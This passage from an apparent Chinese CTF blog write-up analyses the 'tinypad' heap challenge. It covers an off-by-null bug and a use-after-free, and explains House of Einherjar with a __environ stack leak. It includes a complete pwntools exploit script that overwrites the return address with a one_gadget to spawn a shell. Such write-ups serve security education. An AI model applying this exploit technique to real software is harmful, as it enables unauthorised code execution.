class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">tinypad</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">    <span class=\"type\">int</span> size;   <span class=\"comment\">//8byte</span></span><br><span class=\"line\">    <span class=\"type\">char</span> content[size]; <span class=\"comment\">//malloc</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这个程序具有add、free、edit、show功能，其中show是程序自带的，在输入命令之前会先输出所有的content。</p>\n<p>需要重点关注的是tinypad的数组，以tinypad[16*idx+0x100/0x108]的形式利用。idx==1也就是第一个tinypad的size是在tinypad[0x110]的位置，每一项总共也就0x10的空间，而前面0x110的空间是留给edit功能的。</p>\n<p>由于存在off by null，因此我们可以修改prev_size和prev_inuse并触发前向合并来造成overlapping。</p>\n<p>最多能同时有4个chunk，最大的size为0x100。</p>\n<p>edit功能比较复杂，在检验输入之后，会将该chunk用strcpy复制到tinypad偏移为0的位置进行操作，并且<strong>edit的长度和已经写入的字符串的长度相等</strong>，写入完成后才会将tinypad处的内容strcpy到chunk。由于strcpy会被\\x00截断，因此如果该chunk中有地址的话，edit的长度会比较小。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">write_n((__int64)<span class=\"string\">&quot;(INDEX)&gt;&gt;&gt; &quot;</span>, <span class=\"number\">11LL</span>);    <span class=\"comment\">// Edit</span></span><br><span class=\"line\">idx = read_int();</span><br><span class=\"line\"><span class=\"keyword\">if</span> ( idx &lt;= <span class=\"number\">0</span> || idx &gt; <span class=\"number\">4</span> )</span><br><span class=\"line\">    <span class=\"keyword\">goto</span> LABEL_29;</span><br><span class=\"line\"><span class=\"keyword\">if</span> ( !*(_QWORD *)&amp;tinypad[<span class=\"number\">16</span> * idx + <span class=\"number\">0xF0</span>] )</span><br><span class=\"line\">    <span class=\"keyword\">goto</span> LABEL_31;</span><br><span class=\"line\">c = <span class=\"string\">&#x27;0&#x27;</span>;</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(tinypad, *(<span class=\"type\">const</span> <span class=\"type\">char</span> **)&amp;tinypad[<span class=\"number\">16</span> * idx + <span class=\"number\">0xF8</span>]);<span class=\"comment\">// edit时会将其复制到tinypad中进行操作</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> ( <span class=\"built_in\">toupper</span>(c) != <span class=\"string\">&#x27;Y&#x27;</span> )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    write_n((__int64)<span class=\"string\">&quot;CONTENT: &quot;</span>, <span class=\"number\">9LL</span>);</span><br><span class=\"line\">    v6 = <span class=\"built_in\">strlen</span>(tinypad);</span><br><span class=\"line\">    writeln((__int64)tinypad, v6);          <span class=\"comment\">// 会先输出原有的content</span></span><br><span class=\"line\">    write_n((__int64)<span class=\"string\">&quot;(CONTENT)&gt;&gt;&gt; &quot;</span>, <span class=\"number\">13LL</span>);</span><br><span class=\"line\">    len = <span class=\"built_in\">strlen</span>(*(<span class=\"type\">const</span> <span class=\"type\">char</span> **)&amp;tinypad[<span class=\"number\">16</span> * idx + <span class=\"number\">0xF8</span>]);<span class=\"comment\">// 直接取字符串的len值作为长度</span></span><br><span class=\"line\">    read_until((__int64)tinypad, len, <span class=\"string\">&#x27;\\n&#x27;</span>);<span class=\"comment\">// off by null</span></span><br><span class=\"line\">    writeln((__int64)<span class=\"string\">&quot;Is it OK?&quot;</span>, <span class=\"number\">9LL</span>);</span><br><span class=\"line\">    write_n((__int64)<span class=\"string\">&quot;(Y/n)&gt;&gt;&gt; &quot;</span>, <span class=\"number\">9LL</span>);</span><br><span class=\"line\">    read_until((__int64)&amp;c, <span class=\"number\">1uLL</span>, <span class=\"number\">0xA</span>u);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(*(<span class=\"type\">char</span> **)&amp;tinypad[<span class=\"number\">16</span> * idx + <span class=\"number\">0xF8</span>], tinypad);</span><br><span class=\"line\">writeln((__int64)<span class=\"string\">&quot;\\nEdited.&quot;</span>, <span class=\"number\">8LL</span>);</span><br></pre></td></tr></table></figure>\n\n<p>同时释放的函数处也有些小问题（UAF），释放之后没有清空chunk指针，有悬挂指针。虽然有标志位让其在edit的时无法通过检查，但在菜单处没有检查，会照常输出content的内容。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">free</span>(*(<span class=\"type\">void</span> **)&amp;tinypad[<span class=\"number\">16</span> * idx + <span class=\"number\">0xF8</span>]);<span class=\"comment\">// 释放但没请0，不过有标志位edit时也能检查到，不过会照常输出</span></span><br><span class=\"line\">*(_QWORD *)&amp;tinypad[<span class=\"number\">16</span> * idx + <span class=\"number\">0xF0</span>] = <span class=\"number\">0LL</span>;<span class=\"comment\">// 0代表没使用</span></span><br><span class=\"line\">writeln((__int64)<span class=\"string\">&quot;\\nDeleted.&quot;</span>, <span class=\"number\">9LL</span>);</span><br></pre></td></tr></table></figure>\n\n<p>在这里可以通过UAF泄露出当前的heapbase和libcbase。</p>\n<p>一开始尝试释放两个unsorted bin chunk后，<strong>一个的fd指向的是一个堆地址（下一个chunk的地址），另一个fd指向的是unsorted bin头</strong>，通过菜单显示出来。在实际中发现这样需要让两个释放的chunk不连续，并且中间要隔着一个size&lt;0x100的chunk，否则堆地址的低位会是\\x00，输出不出来。</p>\n<p>其实也可以通过释放两个fast bin chunk来泄露堆地址，释放一个unsorted bin chunk来泄露libc。</p>\n<p>在泄露了libcbase和heapbase之后，可以通过House of Einherjar实现overlapping。之后通过fast bin attack修改__malloc_hook为onegadget应该就可以get shell了。不过由于此处edit的特殊性，无法用于修改hook（hook处全为’\\x00’，因此len为0，不能写入东西），所以尝试overlapping到tinypad的位置，控制堆指针获得任意写。</p>\n<p>这里可以利用edit来在tinypad处构造fake chunk，由于<strong>edit会先在tinypad处写入数据</strong>，因此我们可以在此处写入。除此之外<strong>tinypad[0x110]开始就存放了chunk，tinypad[0x110]就是第一个chunk的size</strong>，我们可以不用构造next chunk size。</p>\n<p>为了控制堆指针，我们可以在0x602060处构造fake chunk，让其覆盖到堆指针(size位要为0x101)，并让第三个chunk的size为0x100。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># House of einherjar</span></span><br><span class=\"line\"></span><br><span class=\"line\">tinypad=<span class=\"number\">0x602040</span></span><br><span class=\"line\"></span><br><span class=\"line\">fake_chunk = tinypad+<span class=\"number\">0x20</span> <span class=\"comment\">#0x602060</span></span><br><span class=\"line\">offset=heapbase-fake_chunk+<span class=\"number\">0x50</span> <span class=\"comment\">#计算释放的idx2和fakechunk的偏移</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x48</span>,<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x48</span>)<span class=\"comment\">#idx1 用于off by null</span></span><br><span class=\"line\">add(<span class=\"number\">0xf0</span>,<span class=\"string\">&#x27;b&#x27;</span>*<span class=\"number\">0xf0</span>)<span class=\"comment\">#idx2 用于触发house of einherjar</span></span><br><span class=\"line\">add(<span class=\"number\">0x100</span>,<span class=\"string\">&#x27;c&#x27;</span>*<span class=\"number\">0x100</span>)<span class=\"comment\">#idx3 让0x602160的位置是0x100，使得fake chunk的size和next chunk的presize一致</span></span><br><span class=\"line\">add(<span class=\"number\">0xf0</span>,<span class=\"string\">&#x27;d&#x27;</span>*<span class=\"number\">0xf0</span>)<span class=\"comment\">#idx4</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#construct fake chunk</span></span><br><span class=\"line\">payload=<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x20</span>+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0x101</span>)+p64(fake_chunk)+p64(fake_chunk)<span class=\"comment\">#fd和bk指向自己，绕过检查</span></span><br><span class=\"line\">edit(<span class=\"number\">1</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\">payload=<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x40</span>+p64(offset)<span class=\"comment\">#off by null</span></span><br><span class=\"line\">add(<span class=\"number\">0x48</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">2</span>)<span class=\"comment\"># 触发house of einherjar</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload=<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x20</span>+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0x101</span>)+p64(malloc_hook+<span class=\"number\">0x10</span>+<span class=\"number\">88</span>)+p64(malloc_hook+<span class=\"number\">0x10</span>+<span class=\"number\">88</span>)</span><br><span class=\"line\"><span class=\"comment\">#不知道为什么如果不修改不能malloc，可能fd或者bk有错?</span></span><br><span class=\"line\">edit(<span class=\"number\">3</span>,payload)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>在这之后，fake chunk就被释放合并到了unsorted bin中，下一次malloc会从中获取内存。</p>\n<p><img src=\"./tinypad/hoe.jpg\" alt=\"hoe\"></p>\n<p>然后就可以尝试get shell了，但这里有有些麻烦，由于开启了FULL RELRO，因此无法改写GOT表项，并且程序没有使用stdio，对FILE_IO的利用也不行，不过在libc中有一个全局变量**__environ<strong>，储存着该程序环境变量的地址，而环境变量是储存在</strong>栈**上的，所以可以泄露栈地址，所以可以控制rip。</p>\n<p>*<em>在__environ中的第一个位置上有一个栈地址，而这个栈地址距离main_ret（主程序返回操作）的距离是一个固定的偏移：8</em>30(*__environ-240)**，所以这里就可以找到main_ret的地址，之后我们修改它执行one_gadget即可getshell。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./pwn2&quot;</span>)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&quot;./libc-2.23.so&quot;</span>)</span><br><span class=\"line\">p=process(<span class=\"string\">&quot;./pwn2&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>():</span><br><span class=\"line\">\tgdb.attach(p)</span><br><span class=\"line\">\tpause()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">size,content</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;(CMD)&gt;&gt;&gt; &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;a&#x27;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;(SIZE)&gt;&gt;&gt; &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;(CONTENT)&gt;&gt;&gt; &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(content))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">free</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;(CMD)&gt;&gt;&gt; &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;d&#x27;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;(INDEX)&gt;&gt;&gt; &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">idx,content</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;(CMD)&gt;&gt;&gt; &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;e&#x27;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;(INDEX)&gt;&gt;&gt; &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;(CONTENT)&gt;&gt;&gt; &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(content))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;(Y/n)&gt;&gt;&gt; &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&quot;y&quot;</span>)</span><br><span class=\"line\">\t<span class=\"comment\">#return data</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot; #   INDEX: &quot;</span>+<span class=\"built_in\">str</span>(idx)+<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot; # CONTENT: &quot;</span>)</span><br><span class=\"line\">\t</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0xf0</span>,<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0xf0</span>)<span class=\"comment\">#idx1</span></span><br><span class=\"line\">add(<span class=\"number\">0x60</span>,<span class=\"string\">&#x27;b&#x27;</span>*<span class=\"number\">0x60</span>)<span class=\"comment\">#idx2</span></span><br><span class=\"line\">add(<span class=\"number\">0xf8</span>,<span class=\"string\">&#x27;c&#x27;</span>*<span class=\"number\">0xf8</span>)<span class=\"comment\">#idx3</span></span><br><span class=\"line\">add(<span class=\"number\">0xf0</span>,<span class=\"string\">&#x27;d&#x27;</span>*<span class=\"number\">0xf0</span>)<span class=\"comment\">#idx4</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># leak libc and heap base</span></span><br><span class=\"line\">free(<span class=\"number\">3</span>)</span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">show(<span class=\"number\">1</span>)</span><br><span class=\"line\">heapbase=u64(p.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>)[<span class=\"number\">1</span>:-<span class=\"number\">1</span>].ljust(<span class=\"number\">7</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>).rjust(<span class=\"number\">8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))-<span class=\"number\">0x100</span></span><br><span class=\"line\">log.info(<span class=\"built_in\">hex</span>(heapbase))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">show(<span class=\"number\">3</span>)</span><br><span class=\"line\">malloc_hook=u64(p.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>)[:-<span class=\"number\">1</span>].ljust(<span class=\"number\">8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))-<span class=\"number\">88</span>-<span class=\"number\">0x10</span></span><br><span class=\"line\">libcbase=malloc_hook-libc.sym[<span class=\"string\">&#x27;__malloc_hook&#x27;</span>]</span><br><span class=\"line\">log.info(<span class=\"built_in\">hex</span>(libcbase))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">2</span>)</span><br><span class=\"line\">free(<span class=\"number\">4</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># House of einherjar</span></span><br><span class=\"line\"></span><br><span class=\"line\">tinypad=<span class=\"number\">0x602040</span></span><br><span class=\"line\"></span><br><span class=\"line\">fake_chunk = tinypad+<span class=\"number\">0x20</span></span><br><span class=\"line\">offset=heapbase-fake_chunk+<span class=\"number\">0x50</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x48</span>,<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x48</span>)<span class=\"comment\">#idx1</span></span><br><span class=\"line\">add(<span class=\"number\">0xf0</span>,<span class=\"string\">&#x27;b&#x27;</span>*<span class=\"number\">0xf0</span>)<span class=\"comment\">#idx2</span></span><br><span class=\"line\">add(<span class=\"number\">0x100</span>,<span class=\"string\">&#x27;c&#x27;</span>*<span class=\"number\">0x100</span>)<span class=\"comment\">#idx3</span></span><br><span class=\"line\">add(<span class=\"number\">0xf0</span>,<span class=\"string\">&#x27;d&#x27;</span>*<span class=\"number\">0xf0</span>)<span class=\"comment\">#idx4</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#construct fake chunk</span></span><br><span class=\"line\">payload=<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x20</span>+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0x101</span>)+p64(fake_chunk)+p64(fake_chunk)</span><br><span class=\"line\">edit(<span class=\"number\">1</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\">payload=<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x40</span>+p64(offset)</span><br><span class=\"line\">add(<span class=\"number\">0x48</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload=<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x20</span>+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0x101</span>)+p64(malloc_hook+<span class=\"number\">88</span>+<span class=\"number\">0x10</span>)+p64(malloc_hook+<span class=\"number\">88</span>+<span class=\"number\">0x10</span>)</span><br><span class=\"line\">edit(<span class=\"number\">3</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#get shell</span></span><br><span class=\"line\"></span><br><span class=\"line\">one_gadget=[<span class=\"number\">0x45226</span>,<span class=\"number\">0x4527a</span>,<span class=\"number\">0xf03a4</span>,<span class=\"number\">0xf1247</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#reset heap addr</span></span><br><span class=\"line\">environ_addr=libcbase+libc.symbols[<span class=\"string\">&#x27;__environ&#x27;</span>]</span><br><span class=\"line\">log,info(<span class=\"built_in\">hex</span>(environ_addr))</span><br><span class=\"line\">payload=<span class=\"string\">&#x27;a&#x27;</span>*(<span class=\"number\">0x100</span>-<span class=\"number\">0x30</span>)+p64(<span class=\"number\">0x100</span>)+p64(environ_addr)+p64(<span class=\"number\">0x100</span>)+p64(<span class=\"number\">0x602148</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0xf8</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#leak __environ</span></span><br><span class=\"line\">show(<span class=\"number\">1</span>)</span><br><span class=\"line\">stack_addr=u64(p.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>)[:-<span class=\"number\">1</span>].ljust(<span class=\"number\">8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">log.info(<span class=\"string\">&quot;stack: &quot;</span>+<span class=\"built_in\">hex</span>(stack_addr))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">2</span>,p64(stack_addr-<span class=\"number\">240</span>))</span><br><span class=\"line\">edit(<span class=\"number\">1</span>,p64(libcbase+one_gadget[<span class=\"number\">0</span>]))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#debug()</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;(CMD)&gt;&gt;&gt; &quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">&#x27;q&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class=\"line\"><span class=\"comment\"># constraints:</span></span><br><span class=\"line\"><span class=\"comment\">#   rax == NULL</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class=\"line\"><span class=\"comment\"># constraints:</span></span><br><span class=\"line\"><span class=\"comment\">#   [rsp+0x30] == NULL</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span></span><br><span class=\"line\"><span class=\"comment\"># constraints:</span></span><br><span class=\"line\"><span class=\"comment\">#   [rsp+0x50] == NULL</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class=\"line\"><span class=\"comment\"># constraints:</span></span><br><span class=\"line\"><span class=\"comment\">#   [rsp+0x70] == NULL</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"<p>这是道House of Einherjar</p>","more":"<p>64位堆题，NO PIE，其他都开了。</p>\n<p>House of Einherjar</p>\n<p>在read_until函数中存在off by null，当读入size字节并且没有遇到结束符时，会<strong>多写一个\\x00</strong>。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">unsigned</span> __int64 __fastcall <span class=\"title function_\">read_until</span><span class=\"params\">(__int64 buf, <span class=\"type\">unsigned</span> __int64 size, <span class=\"type\">unsigned</span> <span class=\"type\">int</span> end_char)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 i; <span class=\"comment\">// [rsp+28h] [rbp-18h]</span></span><br><span class=\"line\">  __int64 v6; <span class=\"comment\">// [rsp+30h] [rbp-10h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = <span class=\"number\">0LL</span>; i &lt; size; ++i )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v6 = read_n(<span class=\"number\">0</span>, buf + i, <span class=\"number\">1uLL</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v6 &lt; <span class=\"number\">0</span> )</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"number\">-1LL</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !v6 || *(<span class=\"type\">char</span> *)(buf + i) == end_char )</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  *(_BYTE *)(buf + i) = <span class=\"number\">0</span>;                      <span class=\"comment\">// 正常结束循环会多写一个\\x00，off by null</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( i == size &amp;&amp; *(_BYTE *)(size - <span class=\"number\">1</span> + buf) != <span class=\"number\">10</span> )</span><br><span class=\"line\">    dummyinput(end_char);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> i;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>tinypad结构体:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">tinypad</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">    <span class=\"type\">int</span> size;   <span 